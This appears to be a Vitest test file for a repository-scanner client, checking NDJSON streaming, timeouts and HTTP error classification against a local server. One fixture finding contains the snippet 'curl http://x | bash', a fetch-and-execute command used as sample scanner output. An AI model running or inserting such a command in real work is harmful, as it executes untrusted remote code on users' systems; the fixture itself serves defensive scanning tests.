// Tests for the scan client's transport contract: NDJSON streaming, timeouts,
// error classification and the request body.
//
// These run against a real local HTTP server rather than a mocked fetch, so the
// actual streaming and abort code paths execute. The live scanrepo.dev API is
// exercised separately in the E2E suite, which keeps `npm test` deterministic and
// avoids rate-limiting a third-party service from the unit suite.
import { createServer } from 'node:http';
import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import { ScanError, scanRepo } from '../../src/lib/scan-client.js';

/** @type {import('node:http').Server} */
let server;
let baseUrl;
/** @type {Array<{method: string, url: string, body: any}>} */
let requests = [];
/** Handler applied to the next request. */
let handler = () => {
  throw new Error('no handler set');
};

function ndjson(...events) {
  return events.map((event) => `${JSON.stringify(event)}\n`).join('');
}

function progress(step, value) {
  return { type: 'progress', step, progress: value };
}

function result(data) {
  return { type: 'result', data };
}

const FULL_REPORT = {
  meta: { owner: 'octocat', repo: 'Hello-World', provider: 'github' },
  riskLevel: 'safe',
  riskScore: 4,
  commitSha: '7fd1a60b01f91b314f59955a4e4d4e80d8edf11d',
  findings: [
    {
      ruleId: 'shell-exec',
      title: 'Shell execution',
      description: 'Runs a shell command.',
      severity: 'critical',
      filePath: 'install.sh',
      snippet: 'curl http://x | bash',
    },
  ],
};

beforeAll(async () => {
  server = createServer((req, res) => {
    let raw = '';
    req.on('data', (chunk) => {
      raw += chunk;
    });
    req.on('end', () => {
      let body = null;
      try {
        body = JSON.parse(raw || 'null');
      } catch {
        // A non-JSON payload stays null so the assertion can report the raw body.
      }
      requests.push({ method: req.method ?? '', url: req.url ?? '', body });
      handler(req, res, body);
    });
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  const address = server.address();
  baseUrl = `http://127.0.0.1:${typeof address === 'object' && address ? address.port : 0}/scan`;
});

afterAll(async () => {
  await new Promise((resolve) => server.close(resolve));
});

beforeEach(() => {
  requests = [];
  handler = () => {
    throw new Error('no handler set');
  };
});

/**
 * Point the client at the local server. The endpoint is a module constant, so the
 * global fetch is wrapped to redirect only scanrepo.dev calls.
 */
function useLocalEndpoint() {
  const original = globalThis.fetch;
  globalThis.fetch = (input, init) => {
    const url = String(input);
    if (url.startsWith('https://www.scanrepo.dev/api/scan')) {
      return original(baseUrl, init);
    }
    return original(input, init);
  };
  return () => {
    globalThis.fetch = original;
  };
}

describe('scanRepo transport', () => {
  it('POSTs the documented body with the token and publish flag', async () => {
    handler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/x-ndjson' });
      res.end(ndjson(result(FULL_REPORT)));
    };
    const restore = useLocalEndpoint();
    try {
      await scanRepo(
        { owner: 'octocat', repo: 'Hello-World', provider: 'github' },
        { githubToken: 'ghp_secret', publish: true },
      );
    } finally {
      restore();
    }

    expect(requests).toHaveLength(1);
    expect(requests[0].method).toBe('POST');
    // scanrepo.dev rejects a bare `owner/repo` with HTTP 400.
    expect(requests[0].body.url).toBe('github.com/octocat/Hello-World');
    expect(requests[0].body.publish).toBe(true);
    expect(requests[0].body.token).toBe('ghp_secret');
  });

  it('omits the token and defaults publish to false', async () => {
    handler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/x-ndjson' });
      res.end(ndjson(result(FULL_REPORT)));
    };
    const restore = useLocalEndpoint();
    try {
      await scanRepo({ owner: 'a', repo: 'b' });
    } finally {
      restore();
    }

    expect(requests[0].body).toEqual({ url: 'github.com/a/b', publish: false });
    expect('token' in requests[0].body).toBe(false);
  });

  it('parses a streamed report and returns the raw shape', async () => {
    handler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/x-ndjson' });
      res.end(ndjson(result(FULL_REPORT)));
    };
    const restore = useLocalEndpoint();
    const report = await scanRepo({ owner: 'octocat', repo: 'Hello-World' });
    restore();

    expect(report.riskLevel).toBe('safe');
    expect(report.riskScore).toBe(4);
    expect(report.commitSha).toMatch(/^[0-9a-f]{7,40}$/i);
    expect(report.meta.owner).toBe('octocat');
    expect(report.findings).toHaveLength(1);
  });

  it('surfaces progress frames in order before the result', async () => {
    handler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/x-ndjson' });
      res.end(
        ndjson(
          progress('Cloning repository...', 10),
          progress('Analyzing files...', 60),
          progress('Finalizing...', 95),
          result(FULL_REPORT),
        ),
      );
    };
    const restore = useLocalEndpoint();
    const steps = [];
    await scanRepo({ owner: 'octocat', repo: 'Hello-World' }, {}, (p) => steps.push(p));
    restore();

    expect(steps.map((s) => s.step)).toEqual([
      'Cloning repository...',
      'Analyzing files...',
      'Finalizing...',
    ]);
    expect(steps.map((s) => s.progress)).toEqual([10, 60, 95]);
  });

  it('reassembles NDJSON split across chunk boundaries', async () => {
    // A progress frame deliberately split mid-line, as a real stream would arrive.
    handler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/x-ndjson' });
      const payload = ndjson(progress('Cloning repository...', 10), result(FULL_REPORT));
      const cut = Math.floor(payload.length / 2);
      res.write(payload.slice(0, cut));
      setTimeout(() => res.end(payload.slice(cut)), 20);
    };
    const restore = useLocalEndpoint();
    const steps = [];
    const report = await scanRepo({ owner: 'octocat', repo: 'Hello-World' }, {}, (p) =>
      steps.push(p.step),
    );
    restore();

    expect(steps).toEqual(['Cloning repository...']);
    expect(report.riskScore).toBe(4);
  });

  it('throws timeout when the server never responds', async () => {
    handler = () => {
      // Never respond; the client must abort.
    };
    const restore = useLocalEndpoint();
    await expect(
      scanRepo({ owner: 'octocat', repo: 'Hello-World' }, { timeoutMs: 50 }),
    ).rejects.toMatchObject({ code: 'timeout' });
    restore();
  });

  it('classifies HTTP 429 as rate-limited and explains the token fix', async () => {
    handler = (_req, res) => {
      res.writeHead(429, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Too many requests' }));
    };
    const restore = useLocalEndpoint();
    await expect(scanRepo({ owner: 'a', repo: 'b' })).rejects.toMatchObject({
      code: 'rate-limited',
    });
    restore();
  });

  it('classifies HTTP 400 as a bad request', async () => {
    handler = (_req, res) => {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'URL is required' }));
    };
    const restore = useLocalEndpoint();
    await expect(scanRepo({ owner: '', repo: '' })).rejects.toMatchObject({
      code: 'bad-request',
    });
    restore();
  });

  it('classifies HTTP 404 as unscannable', async () => {
    handler = (_req, res) => {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Repository not found' }));
    };
    const restore = useLocalEndpoint();
    await expect(scanRepo({ owner: 'x', repo: 'nope' })).rejects.toMatchObject({
      code: 'unscannable',
    });
    restore();
  });

  it('classifies HTTP 500 as a server error', async () => {
    handler = (_req, res) => {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Boom' }));
    };
    const restore = useLocalEndpoint();
    await expect(scanRepo({ owner: 'a', repo: 'b' })).rejects.toMatchObject({
      code: 'http-error',
    });
    restore();
  });

  it('reports a stream with no result frame rather than returning undefined', async () => {
    handler = (_req, res) => {
      res.writeHead(200, { 'Content-Type': 'application/x-ndjson' });
      res.end(ndjson(progress('Cloning repository...', 10)));
    };
    const restore = useLocalEndpoint();
    await expect(scanRepo({ owner: 'a', repo: 'b' })).rejects.toBeInstanceOf(ScanError);
    restore();
  });

  it('always raises ScanError so the UI can classify the failure', async () => {
    handler = (_req, res) => {
      res.writeHead(503, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ error: 'Unavailable' }));
    };
    const restore = useLocalEndpoint();
    await expect(scanRepo({ owner: 'a', repo: 'b' })).rejects.toBeInstanceOf(ScanError);
    restore();
  });
});